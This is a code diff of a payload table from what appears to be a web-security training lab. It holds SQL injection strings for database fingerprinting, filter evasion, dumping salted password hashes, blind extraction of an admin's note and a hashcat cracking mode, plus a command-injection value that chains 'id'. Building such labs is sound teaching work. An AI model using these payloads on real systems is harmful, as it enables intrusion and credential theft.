@@ -168,8 +168,8 @@ const PAYLOADS = {
  q:{
   easy:{p:"' UNION SELECT @@version,current_user(),database()-- -", n:"Easy — raw UNION. Goal: fingerprint the DB (version / DB user / current database) — your first recon."},
   medium:{p:"' UNIunionON SELselectECT table_name,table_schema,3 FROM information_schema.tables WHERE table_schema=database()-- -", n:"Medium — 'union'/'select' stripped once → nest them. Goal: enumerate the tables (schema discovery)."},
-  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,password,role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #. Goal: dump every user's credentials (the password shows in the email slot)."},
-  expert:{p:"zzz' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Goal: extract the hidden flag char-by-char: ' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -"}
+  hard:{p:"'/**/UNIunionON/**/SELselectECT/**/username,CONCAT(password,0x3a,salt),role/**/FROM/**/users#", n:"Hard — + spaces stripped → /**/ for spaces, end with #. Goal: dump every user's credentials — passwords are salted MD5, so grab hash:salt (email slot) and crack with hashcat -m 10."},
+  expert:{p:"' OR 1=1-- -", n:"Expert — BLIND (match/no-match). Goal: extract the hidden flag char-by-char: ' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -"}
  },
  cmd:{
   easy:{p:"127.0.0.1; id", n:"Easy — raw; chain with ;. Goal: who am I? (uid / gid / groups)."},
